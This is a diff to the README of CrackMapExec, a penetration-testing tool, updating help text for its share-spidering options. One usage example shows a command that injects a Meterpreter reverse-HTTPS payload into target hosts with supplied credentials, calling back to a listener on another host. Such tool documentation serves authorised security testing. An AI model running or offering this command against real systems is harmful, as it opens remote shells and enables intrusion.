@@ -90,11 +90,14 @@ Mapping/Enumeration:
 Spidering:
   Options for spidering shares
 
-  --spider FOLDER       Folder to spider (defaults to share root dir)
-  --pattern PATTERN     Pattern to search for in filenames and folders
+  --spider FOLDER       Folder to spider
+  --search-content      Enable file content searching
+  --exclude-dirs DIR_LIST
+                        Directories to exclude from spidering
+  --pattern PATTERN     Pattern to search for in folders, filenames and file content (if enabled)
   --patternfile PATTERNFILE
-                        File containing patterns to search for
-  --depth DEPTH         Spider recursion depth (default: 1)
+                        File containing patterns to search for in folders, filenames and file content (if enabled)
+  --depth DEPTH         Spider recursion depth (default: 10)
 
 Command Execution:
   Options for executing commands
@@ -285,7 +288,6 @@ Lets spider the C$ share starting from the ```Users``` folder for the pattern ``
 Directly inject Meterpreter into memory forcing the Powershell code to run in a 32bit process
 ```
 #~ python crackmapexec.py -t 100 192.168.2.5-6 -u username -p password --force-ps32 --inject met_reverse_https --met-options 192.168.2.1 4545
-
 [*] Press CTRL-C at any time to exit
 [*] Note: This might take some time on large networks! Go grab a redbull!
 
